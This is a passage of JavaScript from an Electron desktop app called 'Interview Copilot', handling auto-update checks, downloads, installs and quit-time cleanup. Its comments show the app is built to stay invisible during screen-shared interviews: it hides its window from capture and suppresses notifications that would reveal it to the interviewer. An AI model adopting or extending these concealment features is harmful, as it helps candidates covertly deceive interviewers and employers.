        const pb = String(b || '').split('.').map((n) => parseInt(n, 10) || 0);
        for (let i = 0; i < 3; i++) {
          const ai = pa[i] || 0;
          const bi = pb[i] || 0;
          if (ai !== bi) return ai - bi;
        }
        return 0;
      }

      // The 6s launch-install window. If `update-downloaded` fires while
      // this is still active, it's a cached update from a prior session
      // → install immediately. If it fires later (a fresh download finished
      // mid-session), we let the renderer prompt the user instead.
      //
      // Installs here are non-silent on purpose: the NSIS oneClick "silent"
      // mode passes /S and tears down the installer UI before it has finished
      // waiting for the running Electron process to release file locks on the
      // .exe/.dll/.asar. That races with our teardown (tray, UIA bridge,
      // better-sqlite3 flush) and in the worst case leaves the installed
      // files unchanged while isForceRunAfter relaunches the *old* binary —
      // which is what produced the "install-loops-every-launch" report.
      // Non-silent shows a ~1s NSIS progress window that blocks until files
      // are actually replaced, which is what we want.
      let launchInstallActive = true;
      const launchInstallTimer = setTimeout(() => {
        launchInstallActive = false;
        electronLog.info('[updater] launch-install window closed');
      }, 6000);

      autoUpdater.on('checking-for-update', () => {
        sendUpdateStatus('checking', {});
      });

      autoUpdater.on('update-available', (info) => {
        sendUpdateStatus('available', { version: info.version, releaseNotes: info.releaseNotes });
      });

      autoUpdater.on('update-not-available', () => {
        sendUpdateStatus('up-to-date', {});
        launchInstallActive = false;
        clearTimeout(launchInstallTimer);
        // Launch-blink gate: nothing to install — paint the window now.
        showBootWindow();
      });

      autoUpdater.on('download-progress', (progress) => {
        sendUpdateStatus('downloading', {
          percent: Math.round(progress.percent),
          transferred: progress.transferred,
          total: progress.total,
        });
      });

      autoUpdater.on('update-downloaded', (info) => {
        // Defensive: electron-updater can fire this for a cached installer
        // whose version equals (or is below) our running version — e.g. when
        // a previous install left a same-version .exe in pending/ and the
        // version check on this launch races the cache read. Installing in
        // that state would quit, run a no-op installer, relaunch the same
        // binary, and loop. Detect and refuse.
        const running = app.getVersion();
        const incoming = info && info.version;
        if (!incoming || compareAppVersions(incoming, running) <= 0) {
          electronLog.warn(
            `[updater] update-downloaded fired for stale/regression version: incoming=${incoming} running=${running} — refusing to install`
          );
          launchInstallActive = false;
          clearTimeout(launchInstallTimer);
          // Don't touch pendingUpdate/installPendingUpdate — leave them null
          // so before-quit / X-close / tray Quit don't try to install the
          // stale cache either. Treat the app as up-to-date for the UI.
          sendUpdateStatus('up-to-date', {});
          // Launch-blink gate: the pending cache was stale — show the window.
          showBootWindow();
          return;
        }

        pendingUpdate = { version: incoming, info };
        // Non-silent — see the rationale above the launch-install window.
        // Applies to every quit-time install path (before-quit hook, X-close
        // dialog) so they all benefit from NSIS holding files locked until
        // replacement actually completes.
        installPendingUpdate = () => performInstall(false);
        sendUpdateStatus('ready', { version: incoming });

        // Self-heal: when this boot was flagged as a downgrade
        // resurrection, install the moment the download lands even if it
        // took longer than the launch window (a full download does) —
        // waiting for a user click would leave the resurrected old
        // version in front of them.
        if (launchInstallActive || selfHealDowngrade) {
          launchInstallActive = false;
          clearTimeout(launchInstallTimer);
          electronLog.info(`[updater] update ${incoming} ready at launch (selfHeal=${selfHealDowngrade}) — installing (non-silent)`);
          // Tiny defer so the renderer can flush the 'ready' status; not
          // strictly necessary but avoids a hard-cut transition for users
          // who happen to see the brief flash before relaunch.
          setTimeout(() => performInstall(false), 200);
        }
      });

      autoUpdater.on('error', (err) => {
        electronLog.error('[updater] error:', err && err.message);
        sendUpdateStatus('error', { message: err && err.message });
        launchInstallActive = false;
        clearTimeout(launchInstallTimer);
        // Launch-blink gate: check failed (offline etc.) — never keep the
        // user staring at nothing; show the window.
        showBootWindow();
      });

      // ── Why every check below is checkForUpdates, never ...AndNotify ──
      // checkForUpdatesAndNotify chains a `new Notification(...).show()`
      // onto the download promise (electron-updater AppUpdater.js:286-300),
      // with the default body "A new update is ready to install". Since
      // autoDownload is true, ANY check that finds a new version downloads
      // it and then pops a native Windows toast titled "Interview Copilot".
      // A native toast is a separate HWND — setContentProtection does not
      // touch it — so on a screen-shared interview it lands in the frame the
      // interviewer is watching, with our brand on it. The app already has
      // its own in-app "Restart & Update" prompt driven by sendUpdateStatus,
      // which is the whole point of the launch-check comment below; these
      // paths just needed to say the same thing.

      // User clicks "Restart & Update" in Settings — show the installer
      // UI (non-silent) so they get visual feedback during the swap. If
      // no download is ready yet, kick a check; the renderer prompt will
      // fire again once update-downloaded comes through.
      ipcMain.on('install-update', () => {
        if (pendingUpdate) {
          performInstall(false);
        } else {
          autoUpdater.checkForUpdates().catch((e) => {
            electronLog.error('[updater] install-update check failed:', e && e.message);
          });
        }
      });

      ipcMain.on('check-for-updates', () => {
        autoUpdater.checkForUpdates().catch((e) => {
          electronLog.error('[updater] manual check failed:', e && e.message);
        });
      });

      // Kick the launch check immediately. Use checkForUpdates (not
      // ...AndNotify) so we don't show a duplicate native OS notification
      // alongside our renderer prompt during the brief launch window.
      autoUpdater.checkForUpdates().catch((e) => {
        electronLog.error('[updater] launch check failed:', e && e.message);
      });

      // Periodic re-check for long-running sessions (tray apps stay alive
      // for days — they need to discover updates without a relaunch).
      //
      // Never while a session is live. Even with the native toast gone, a
      // tick that lands 40 minutes into a screen-shared interview downloads
      // a full NSIS installer in the background (disableDifferentialDownload
      // is on) and fires update-status at the renderer, which is enough to
      // put an update prompt on screen at the worst possible moment. The
      // user is not going to restart mid-interview anyway. Skipping costs
      // us one 30-minute tick; the next one picks it up. Same sessionActive
      // gate every other notification path in this file uses.
      setInterval(() => {
        if (sessionActive) return;
        autoUpdater.checkForUpdates().catch(() => {});
      }, 30 * 60 * 1000);
    } catch (err) {
      console.error('[updater] unavailable:', err && err.message);
    }
  }

  app.on('activate', () => {
    if (!mainWindow || mainWindow.isDestroyed()) {
      createMainWindow();
    } else {
      smoothShow(mainWindow);
    }
  });
});

// Don't quit when all windows closed — tray keeps app alive
app.on('window-all-closed', () => {
  // Do nothing — app stays in tray
});

app.on('before-quit', (e) => {
  // If a download is sitting ready, install it now instead of letting it rot
  // in the cache. We are the sole install owner at quit — autoInstallOnAppQuit
  // is deliberately off (see the autoUpdater setup block) to avoid a second,
  // silent install racing this one and failing to replace locked files.
  // performInstall sets isQuitting=true and re-enters this handler once the
  // installer takes over, so the cleanup branch below still runs.
  if (pendingUpdate && installPendingUpdate && !app.isQuitting) {
    e.preventDefault();
    installPendingUpdate();
    return;
  }
  app.isQuitting = true;
  try { globalShortcut.unregisterAll(); } catch (_) {}
  try { killUIABridge(); } catch (_) {}
  database.closeDB();
});
